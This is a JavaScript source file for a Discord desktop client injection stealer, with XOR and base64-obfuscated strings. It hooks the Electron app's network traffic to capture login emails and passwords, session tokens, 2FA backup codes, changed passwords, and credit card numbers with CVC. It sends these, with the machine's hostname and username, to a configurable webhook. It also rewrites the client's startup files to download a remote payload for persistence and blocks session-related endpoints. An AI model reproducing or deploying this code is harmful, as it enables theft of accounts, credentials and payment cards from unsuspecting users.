function _r(s){try{var b=Buffer.from(s,"base64");for(var i=0;i<b.length;i++)b[i]^=0x5A;return b.toString("utf8")}catch(e){return""}}
const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

// ============================================================
// Configuration
// ============================================================
const CFG = {
    wh: "%WEBHOOK%",
    // NOTE: Replace this URL with your own GitHub raw URL
    src: "https://raw.githubusercontent.com/erendl/64/refs/heads/main/injection_original_obf.js",
    ep: [
        "/auth/login",
        "/auth/register",
        "/mfa/totp",
        _r("dTc8O3U5NT4/KXcsPygzPDM5Oy4zNTQ="),
        _r("dS8pPygpdRo3Pw=="),
    ],
    ws: [
        _r("LSkpYHV1KD83NS4/dzsvLjJ3PTsuPy07I3Q+Myk5NSg+dD09dXA="),
        _r("Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LHB1Oy8uMnUpPykpMzU0KQ=="),
        _r("Mi4uKilgdXVwdD4zKTk1KD50OTU3dTsqM3UscHU7Ly4ydSk/KSkzNTQp"),
        _r("Mi4uKilgdXU+Myk5NSg+OyoqdDk1N3U7KjN1LHB1Oy8uMnUpPykpMzU0KQ==")
    ],
    pmt: [
        _r("Mi4uKilgdXU7KjN0OCg7MzQuKD8/PTsuPy07I3Q5NTd1Nz8oOTI7NC4pdW5jKipoKCpuKjIjN21pYm11OTYzPzQuBTsqM3UscHUqOyM3PzQuBTc/LjI1Pil1KjsjKjs2BTs5OTUvNC4p"),
        _r("Mi4uKilgdXU7KjN0KS4oMyo/dDk1N3UscHUuNTE/NCk="),
    ],
    api: _r("Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LGN1Lyk/KCl1Gjc/"),
    tags: {
        Discord_Emloyee: { Value: 1, Emoji: _r("ZmBibmJvPjMpOTUoPj83KjY1Iz8/YGtrbGlrbWhob2hjYmNob2NiY2Jk"), Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: _r("ZmBjY2hiPjMpOTUoPio7KC40Pyg4Oz49P2Bra2xpa21oaWpua29vb2Jsb21qZA=="), Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: _r("ZmBja21rMiMqPykrLzs+Pyw/NC4pYGtrbGlrbWhobmJrbmpsbGpiaWNk"), Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: _r("ZmBubW5uOC89Mi80Lj8oODs+PT8+Myk5NSg+YGtrbGlrbWhoaWNjbWprbmppYmlk"), Rare: true },
        Early_Supporter: { Value: 512, Emoji: _r("ZmBvam9pPzsoNiMpLyoqNSguPyhga2tsaWttaGhua2NjbGpqb25rbGQ="), Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: _r("ZmBrbW9tOC89OC8pLj8oODs+PT8+Myk5NSg+YGtrbGlrbWhoaWJjbmhvbmliY2hk"), Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: _r("ZmBraGptMzk1ND87KDYjODUuPj8sPzY1Kj8oYGtrbGlrbWhoaWxiam1saWNrbmlk"), Rare: true },
        House_Bravery: { Value: 64, Emoji: _r("ZmBsbGprMiMqPykrLzs+OCg7LD8oI2Bra2xpa21oaG5sbmNoaGJtamttZA=="), Rare: false },
        House_Brilliance: { Value: 128, Emoji: _r("ZmBsY2lsMiMqPykrLzs+OCgzNjYzOzQ5P2Bra2xpa21oaG5ubm1uYmhobW5sZA=="), Rare: false },
        House_Balance: { Value: 256, Emoji: _r("ZmBvaG5oMiMqPykrLzs+ODs2OzQ5P2Bra2xpa21oaG5pbmttYm9ia2hiZA=="), Rare: false },
        Active_Developer: { Value: 4194304, Emoji: _r("ZmBraGptMzk1NDs5LjMsPz4/LD82NSo/KGBra2xpa21ob2lubm5pYm9rYmxiZA=="), Rare: false },
        Certified_Moderator: { Value: 262144, Emoji: _r("ZmBua25jODYvKCo2Pzk/KC4zPDM/Pjc1Pj8oOy41KGBra2xpa21oaG9vbmJjamJvbmJrZA=="), Rare: true },
        Spammer: { Value: 1048704, Emoji: _r("uNbyteLV"), Rare: false },
    },
};

// ============================================================
// Utility helpers
// ============================================================
const execJS = script => {
    const w = BrowserWindow.getAllWindows()[0];
    return w.webContents.executeJavaScript(script, !0);
};

const flushLocal = () => {
    execJS(_r("PjU5Lzc/NC50ODU+I3Q7Kio/ND4ZMjM2PnI+NTkvNz80LnQ5KD87Lj8fNj83PzQuOjM8KDs3PzpzdDk1NC4/NC4NMzQ+NS10NjU5OzYJLjUoOz0/dDk2PzsocnM="));
    execJS(_r("NjU5Oy4zNTR0KD82NTs+cnM="));
};

const readSession = async () => await execJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const netReq = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: { "Access-Control-Allow-Origin": "*" },
    };
    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

// ============================================================
// Data collection helpers
// ============================================================
const getPlan = flags => {
    switch (flags) {
        case 1: return '`Nitro Classic`';
        case 2: return '`Nitro Boost`';
        case 3: return '`Nitro Basic`';
        default: return '`❌`';
    }
};

const getTags = flags => {
    let tags = '';
    for (const tag in CFG.tags) {
        let b = CFG.tags[tag];
        if ((flags & b.Value) == b.Value) tags += b.Emoji + ' ';
    }
    return tags || '`❌`';
};

const getRareTags = flags => {
    let tags = '';
    for (const tag in CFG.tags) {
        let b = CFG.tags[tag];
        if ((flags & b.Value) == b.Value && b.Rare) tags += b.Emoji + ' ';
    }
    return tags;
};

const fetchInfo = async (endpoint, headers) => {
    return JSON.parse(await netReq("GET", CFG.api + endpoint, headers));
};

const readProfile = async token => await fetchInfo("", { "Authorization": token });
const readBilling = async token => await fetchInfo(_r("dTgzNjYzND11KjsjNz80LncpNS8oOT8p"), { "Authorization": token });
const readServers = async token => await fetchInfo(_r("dT0vMzY+KWUtMy4yBTk1LzQuKWcuKC8/"), { "Authorization": token });
const readFriends = async token => await fetchInfo("/relationships", { "Authorization": token });

const getPayment = async token => {
    const data = await readBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1: billing += '💳 '; break;
                case 2: billing += '<:paypal:1148653305376034967> '; break;
            }
        }
    });
    return billing || '`❌`';
};

const getContacts = async token => {
    const friends = await readFriends(token);
    const filteredFriends = friends.filter((user) => user.type == 1);
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var tags = getRareTags(acc.user.public_flags);
        if (tags != "") {
            if (!rareUsers) rareUsers = _r("cHAIOyg/ehwoMz80PilgcHAGNA==");
            rareUsers += `${tags} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || _r("cHAUNXoIOyg/ehwoMz80PilwcA==");
    return { message: rareUsers, totalFriends: friends.length };
};

const getGuilds = async token => {
    const guilds = await readServers(token);
    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") rareGuilds += `**Rare Servers:**\n`;
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : _r("ZmA7PjczNGBjbG1ib2tjb2xjaWpuYmhoamxkehs+NzM0")} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }
    rareGuilds = rareGuilds || _r("cHAUNXoIOyg/egk/KCw/KClwcA==");
    return { message: rareGuilds, totalGuilds: guilds.length };
};

// ============================================================
// Dispatch helpers
// ============================================================
const dispatch = async (payload, token, account) => {
    payload["content"] = "`" + os.hostname() + _r("Onp3ejo=") + os.userInfo().username + _r("OgY0BjQ=") + payload["content"];
    payload["username"] = _r("CT85LygzLiN6FzU0My41KA==");
    payload["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
    payload["embeds"][0]["author"] = { "name": account.username };
    payload["embeds"][0]["thumbnail"] = {
        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };
    payload["embeds"][0]["footer"] = {
        "text": _r("KT8pKTM1NHo7Lz4zLg=="),
        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
    };
    payload["embeds"][0]["title"] = _r("Gzk5NS80LnoTNDw1KDc7LjM1NA==");

    const nitro = getPlan(account.premium_type);
    const tags = getTags(account.flags);
    const billing = await getPayment(token);
    const friends = await getContacts(token);
    const servers = await getGuilds(token);

    payload["embeds"][0]["fields"].push(
        { "name": "Token", "value": "```" + token + "```", "inline": false },
        { "name": "Nitro", "value": nitro, "inline": true },
        { "name": "Badges", "value": tags, "inline": true },
        { "name": "Billing", "value": billing, "inline": true }
    );

    payload["embeds"].push(
        { "title": `Total Friends: ${friends.totalFriends}`, "description": friends.message },
        { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
    );

    for (const embed in payload["embeds"]) {
        payload["embeds"][embed]["color"] = 0xb143e3;
    }

    await netReq("POST", CFG.wh, { "Content-Type": _r("OyoqNjM5Oy4zNTR1MCk1NA==") }, JSON.stringify(payload));
};

// ============================================================
// Event handlers
// ============================================================
const onAuthEvent = async (email, password, token, action) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + email + "`", "inline": true },
                { "name": "Password", "value": "`" + password + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onCodesEvent = async (codes, token) => {
    const account = await readProfile(token);
    const filteredCodes = codes.filter((code) => code.consumed === false);
    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const payload = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [
                { "name": _r("GDs5MS8qehk1Pj8p"), "value": "```" + message + "```", "inline": false },
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onPassEvent = async (newPassword, oldPassword, token) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [
                { "name": _r("FD8tego7KSktNSg+"), "value": "`" + newPassword + "`", "inline": true },
                { "name": _r("FTY+ego7KSktNSg+"), "value": "`" + oldPassword + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onCardEvent = async (number, cvc, month, year, token) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [
                { "name": "Number", "value": "`" + number + "`", "inline": true },
                { "name": "CVC", "value": "`" + cvc + "`", "inline": true },
                { "name": "Expiration", "value": "`" + month + "/" + year + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onPaypalEvent = async (token) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

// ============================================================
// Injection bootstrapper
// ============================================================
const locatePaths = (function () {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return { resourcePath, app };
    return { undefined, undefined };
})();

async function bootstrap() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));
        const token = await readSession();
        if (!token) return;
        const account = await readProfile(token);
        const payload = {
            "content": `**${account.username}** just got injected!`,
            "embeds": [{
                "fields": [
                    { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                    { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
                ]
            }]
        };
        await dispatch(payload, token, account);
        flushLocal();
    }

    const { resourcePath, app } = locatePaths;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const pkgJson = path.join(appPath, 'package.json');
    const resIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(pkgJson)) fs.unlinkSync(pkgJson);
    if (fs.existsSync(resIndex)) fs.unlinkSync(resIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(pkgJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const loaderScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size;
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === _r("NzU+LzY/dD8iKjUoLil6Z3ooPysvMyg/cn10dTk1KD90Oyk7KH1z")) 
          init();
  })
  async function init() {
      https.get('${CFG.src}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CFG.wh}');
          res.pipe(file);
          file.on('finish', () => { file.close(); });
      }).on("error", (err) => { setTimeout(init(), 10000); });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resIndex, loaderScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let bootstrapped = false;

const setupDebugger = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!bootstrapped) {
            await bootstrap();
            bootstrapped = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CFG.ep.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return;
                }
                onAuthEvent(requestData.login, requestData.password, responseData.token, _r("NjU9PT8+ejM0"));
                break;

            case params.response.url.endsWith('/register'):
                onAuthEvent(requestData.email, requestData.password, responseData.token, _r("KTM9ND8+ei8q"));
                break;

            case params.response.url.endsWith('/totp'):
                onAuthEvent(email, password, responseData.token, _r("NjU9PT8+ejM0ei0zLjJ6aBwb"));
                break;

            case params.response.url.endsWith('/codes-verification'):
                onCodesEvent(responseData.backup_codes, await readSession());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;
                if (requestData.email) {
                    onAuthEvent(requestData.email, requestData.password, responseData.token, _r("OTI7ND0/PnoyMyl6Pzc7MzZ6LjV6cHA=") + requestData.email + "**");
                }
                if (requestData.new_password) {
                    onPassEvent(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
    mainWindow.on('closed', () => { setupDebugger(); });
};
setupDebugger();

session.defaultSession.webRequest.onCompleted(CFG.pmt, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            onCardEvent(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await readSession());
            break;
        case details.url.endsWith('paypal_accounts'):
            onPaypalEvent(await readSession());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CFG.ws, (details, callback) => {
    if (details.url.startsWith(_r("LSkpYHV1KD83NS4/dzsvLjJ3PTsuPy07Iw==")) || details.url.endsWith("auth/sessions")) {
        return callback({ cancel: true });
    }
});

module.exports = require("./core.asar");
